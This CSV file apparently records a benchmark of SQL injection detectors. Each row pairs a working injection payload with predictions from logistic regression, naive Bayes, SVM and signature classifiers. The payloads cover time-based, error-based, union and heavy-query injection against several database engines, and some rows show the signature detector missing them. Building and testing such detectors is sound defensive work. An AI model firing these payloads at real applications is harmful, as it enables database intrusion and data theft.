payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
1%';(select * from (select(sleep(5)))srmq) and '%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""qkds"" like ""qkds",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1386') or (7880=5362)*5362 and ('vsyu' like 'vsyu,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1' in boolean mode) and sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('wzdo'='wzdo",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-5962)) as jbqv where 2583=2583 or 7496=8560--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('qfsu'='qfsu",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1' rlike (select (case when (6855=1056) then 1 else 0x28 end)) and 'pmrz' like 'pmrz,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"";select (case when (1354=7529) then 1354 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6720'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('enfe' like 'enfe",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'+(select goec where 9460=9460 rlike (select (case when (4740=1203) then 1 else 0x28 end)))+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1 where 8102=8102 and 9198=9198--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and elt(5245=9203,9203) and ('fhlw' like 'fhlw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-1573"") union all select 3928,3928,3928,3928--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 7748=7748 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2112 union all select 2995,2995,2995,2995,2995--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('zypa'='zypa",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) and (5091=8681)*8681 and (('xevm'='xevm,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-7559"" or 8792=6905--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as piwi where 2918=2918;(select * from (select(sleep(5)))acdk)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and (7817=4371)*4371 and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-5150))) union all select 5660,5660,5660#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1');select (case when (9130=1826) then 9130 else 9130*(select 9130 from mysql.db) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7258"") as wjjr where 2110=2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and elt(7554=6257,6257) and ('bpzm'='bpzm",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""rurz""=""rurz",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-5169"")) union all select 6198,6198,6198,6198--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4304' where 1005=1005 union all select 1005,1005#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1 where 7299=7299 rlike sleep(5)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6883"") as tbai where 8121=8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1))) union all select null#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-2573)) order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('nxkp' like 'nxkp,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' where 3700=3700 union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4927')) union all select 1924,1924#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6505')) as jtnp where 1037=1037 or elt(1032=1032,3623)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""tlpw""=""tlpw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1')) as arhm where 3268=3268 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('eflk'='eflk",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""));select benchmark(5000000,md5(0x714e4153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) and (3020=3020)*6703 and (('vvkd' like 'vvkd,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'))) rlike (select (case when (4076=4881) then 1 else 0x28 end)) and ((('grzs'='grzs,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%""))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8557 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 7199=7199 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('dvpw'='dvpw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-6368)) union all select 4646,4646,4646,4646,4646,4646,4646--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' where 9241=9241 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-8047' or 3038=3038,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as crek where 6570=6570 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 where 2278=2278 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-6473' union all select 7537#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7889"")) as oayf where 1765=1765 or 8571=8571--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 7881=7881 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'hstg' like 'hstg",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6890"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""ftho"" like ""ftho",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""));(select * from (select(sleep(5)))acdk)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1083') union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) union all select null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select bgbq where 1589=1589 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' in boolean mode) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%' union all select null#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'yahq' where 6974=6974 union all select null--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")));begin user_lock.sleep(5); end and (((""memh"" like ""memh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-7426' order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((4090=4090",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1)) as jvoo where 5116=5116 or 4240=(select 4240 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") and 3732=3850 and (""edjv""=""edjv",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-8875"") where 8428=8428 or 1519=5756--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%' union all select null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8144') where 1691=1691 or elt(7246=7816,7816)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"";select (case when (1776=7688) then 1776 else 1/(select 0) end)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ggiw'='ggiw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-3377"") or 4982=6608#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4694%""))) union all select 9178,9178,9178,9178,9178--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-2207%') or (8459=8459)*4906 and ('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"")) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""mubt""=""mubt",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' in boolean mode) rlike (select (case when (1343=1595) then 1 else 0x28 end))#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)));select count(*) from generate_series(1,5000000)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-9660)) or 9762=9698,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'+(select tzvm where 5145=5145 and 4192=7437#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 2131=2131 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9462"") as vzga where 4799=4799 or 8691=1048",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1' where 4403=4403 rlike sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) or 8421=(select count(*) from generate_series(1,5000000))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as bovm where 5560=5560 union all select null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""tpxo"" like ""tpxo",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9150%'))) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')));select (case when (1291=6612) then 1 else 1291*(select 1291 from master..sysdatabases) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2325'))) union all select 1442,1442,1442--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1))) and sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 4297=4297 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""));begin user_lock.sleep(5); end and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'qstz' where 6835=6835;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) union all select null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6370')) as sims where 9388=9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1';begin dbms_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4527' union all select 7115,7115#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"(select 1 from generate_series(9352,9352,case when (9352=9352) then 1 else 0 end) limit 1)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4915' union all select 1928,1928,1928,1928#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as yzny where 4869=4869 rlike (select * from (select(sleep(5)))sgvo)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 8387=8387;select (case when (2751=8206) then 2751 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1866')) as cwtv where 3295=3295 order by 1--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6496"") as obnf where 2903=2903 or make_set(9354=9354,7185)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"");select (case when (1898=4705) then 1898 else 1/(select 0) end)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as xyuy where 6894=6894;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2028%'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((9401=9401",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' in boolean mode) or (select * from (select(sleep(5)))sddo)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'uqaf' where 7414=7414;iif(5257=5257,1,1/0)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- jdia,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1')) and make_set(8403=8403,8899) and (('bmsa'='bmsa",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"")) union all select null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) rlike sleep(5) and (('tufg'='tufg,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") order by 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as mwcs where 2544=2544 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and make_set(1167=5027,5027) and ((""grfi""=""grfi",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""hrkf"" like ""hrkf",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-9587 union all select 1568,1568,1568,1568,1568,1568#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2734') union all select 5510,5510,5510,5510,5510#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%' and 8594=(select 8594 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1,(select (case when (5334=4976) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" rlike sleep(5)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%') union all select null,null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%')));begin dbms_lock.sleep(5); end and ((('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'mgrj' where 8514=8514 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as yekp where 3049=3049 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
